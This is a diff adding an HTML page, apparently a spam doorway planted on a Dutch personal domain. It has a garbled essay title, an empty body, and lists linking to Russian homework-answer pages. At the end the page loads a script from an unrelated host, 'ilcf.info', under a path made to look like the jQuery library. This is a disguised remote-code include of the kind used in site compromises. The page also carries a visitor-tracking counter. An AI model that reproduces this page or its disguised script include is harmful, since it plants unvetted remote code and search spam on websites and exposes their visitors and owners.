@@ -1,0 +1,140 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Сочинениеминем иң яраткан шөгылем - theaho.rinkehoekstra.nl</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">theaho.rinkehoekstra.nl</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Сочинениеминем иң яраткан шөгылем</h2>
+                            </header>
+                            <p></p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="giihs5-zadachi-po-fiziki-8-klass-reshebnik.html">Задачи по физики 8 класс решебник</a></li>
+                                <li><a href="giihs5-osnovnye-ponyatiya-himicheskoy-termodinamiki-shpargalka.html">Основные понятия химической термодинамики шпаргалка</a></li>
+                                <li><a href="giihs5-gdz-po-gkometrii-10-11.html">Гдз по гкометрии 10 11</a></li>
+                                <li><a href="giihs5-gdz-po-rabochey-tetradi-po-okruzhayuschemu-miru-3-klass-vahrushev-chast-1.html">Гдз по рабочей тетради по окружающему миру 3 класс вахрушев часть 1</a></li>
+                                <li><a href="giihs5-napisat-sochinenie-po-romansu-poruchik-golicyn.html">Написать сочинение по романсу поручик голицын</a></li>
+                                <li><a href="giihs5-skotovodstvo-v-kbr-referat.html">Скотоводство в кбр реферат</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"></ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="giihs5-reshebnik-3-klass-po-russkomu-vernikovskaya.html">Решебник 3 класс по русскому верниковская</a></li>
+                                            <li><a href="giihs5-gdz-po-kompleksnomu-analizu-teksta-6-klass-erohina-tekst-15.html">Гдз по комплексному анализу текста 6 класс ерохина текст 15</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="giihs5-gdz-po-russkomu-yazyku-rabochaya-tetrad-3-klass-klimanova-i-babushkina-1-chast.html">Гдз по русскому языку рабочая тетрадь 3 класс климанова и бабушкина 1 часть</a></li>
+                                            <li><a href="giihs5-gdz-po-fiziki-8-klass-peryshkin-uprazhnenie-34.html">Гдз по физики 8 класс перышкин упражнение 34</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="giihs5-gdz-po-fiziki-10-klass-parfenteva.html">Гдз по физики 10 класс парфентьева</a></li>
+                                            <li><a href="giihs5-rudzitis-reshebnik-po-himii-8-klass-2012.html">Рудзитис решебник по химии 8 класс 2012</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="giihs5-reshebnik-po-matematike-5-biboletova.html">Решебник по математике 5 биболетова</a></li>
+                                            <li><a href="giihs5-konstitucionnyy-status-gosudarstvennoy-dumy-federalnogo-sobraniya-rossiyskoy-federacii-referat.html">Конституционный статус государственной думы федерального собрания российской федерации реферат</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://ilcf.info/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
